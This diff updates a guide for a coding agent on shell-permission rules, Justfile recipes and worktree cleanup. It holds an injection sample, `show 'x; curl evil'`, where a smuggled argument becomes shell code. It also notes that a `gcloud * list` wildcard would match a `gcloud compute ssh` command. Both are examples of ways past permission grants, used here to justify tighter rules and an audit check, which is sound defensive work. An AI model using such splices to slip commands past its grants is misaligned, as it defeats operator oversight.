@@ -21,9 +21,19 @@ through `claude-sync` (see the `claude-workstation-setup` skill).
 **Global read-only allow set.** `git status/diff/log/branch/show/worktree
 list`, `gh pr view/list/checks/diff`, `gh run view/list`, `just --list`,
 `WebSearch`, `WebFetch` for github.com and raw.githubusercontent.com, and
-`mcp__ide__getDiagnostics`. Exxo adds `gcloud * list/describe`, `pulumi
-preview/whoami/stack ls/stack output`, and `agent-tooling:*`. A repo never
-restates any of these.
+`mcp__ide__getDiagnostics`. Exxo adds an enumerated set of read-only `gcloud` commands
+(`projects list`, `config list`, `run services list/describe`, `compute
+instances list/describe`, `logging read`, `storage ls`, ...) plus `gsutil ls`,
+`pulumi preview/whoami/stack ls/stack output`, and `agent-tooling:*`, and
+denies `gcloud compute ssh`. There is deliberately no `gcloud * list` grant:
+a middle `*` also matches `gcloud compute ssh vm --command "... list"`. A repo
+never restates any of these.
+
+**Write commands subcommand-first.** Rules match the command text from the
+start, so `pulumi preview:*` matches `pulumi preview -s dev` but not `pulumi
+-C infra -s dev preview`. Docs, recipes and your own invocations spell
+pulumi (and gcloud) commands subcommand-first, with the target flags after:
+`pulumi preview -C <dir> -s <stack>`.
 
 **Committed `.claude/settings.json`** holds only these:
 1. Named recipe grants, one per recipe: `Bash(just check:*)`,
@@ -93,12 +103,34 @@ or in the main `Justfile` as a named recipe. That file is never blanket-trusted,
 so each run is approved per use. A dated one-off (`*-july-urls`) belongs in
 neither: run it ad hoc.
 
+**Parameters are data, never shell.** Just substitutes `{{ param }}` into the
+recipe text before the shell parses it, so under a blanket grant the argument
+the model passes becomes shell code (`just --justfile=agent/Justfile show 'x;
+curl evil'`). In `agent/Justfile`, put `set positional-arguments` at the top
+and reference arguments as `"$1"`, `"$2"`, ... (quoted); never write
+`{{ param }}` in a shell line. Functions such as `{{ justfile_directory() }}`
+are not parameters and are fine. The audit's `justfile-param-splice` check
+(error level) reports `agent/Justfile:<recipe>` for any recipe that splices
+one of its own parameters while the file is blanket-trusted.
+
 Splitting a recipe out:
 1. Move the recipe into `agent/Justfile.ops`. Add a header comment saying the
    file is not blanket-trusted.
 2. Call it as `just --justfile=agent/Justfile.ops <recipe>` and accept the
    prompt each time. Grant nothing for that file.
 3. Update the repo CLAUDE.md pointer that names the recipe.
+
+## Worktrees: submodules and closedown
+
+In the Exxo repos every worktree carries the vendored `.claude/vendor/skills`
+submodule, so `git worktree remove` refuses with `working trees containing
+submodules cannot be moved or removed`. That refusal is what has been leaving
+dangling worktrees behind; it is not a blocker. Closedown is: confirm the
+worktree is clean (`git status --porcelain` empty) and its branch merged,
+relocate any session transcripts per the `worktree-closedown` skill, then
+`rm -rf <worktree> && git -C <primary> worktree prune`. With worktrunk,
+`wt remove <branch>` does the equivalent itself. Full procedure, including
+the submodule unsaved-work check: the `worktree-closedown` skill.
 
 ## CLAUDE.md: at most 300 lines, no restated globals
 
@@ -177,5 +209,5 @@ git repo. When it finds something, you see a one-line "Claude config drift in
 The warning reports drift; it doesn't ask you to fix anything. Mention it to
 the operator. Fix it only if they ask, or if the task already touches repo
 config. Never fix it by weakening the audit or the floor. Errors (dangerous
-grants, a mutating blanket-trusted recipe) deserve a sentence in your first
+grants, a mutating or parameter-splicing blanket-trusted recipe) deserve a sentence in your first
 reply. Warnings can wait for a config pass.
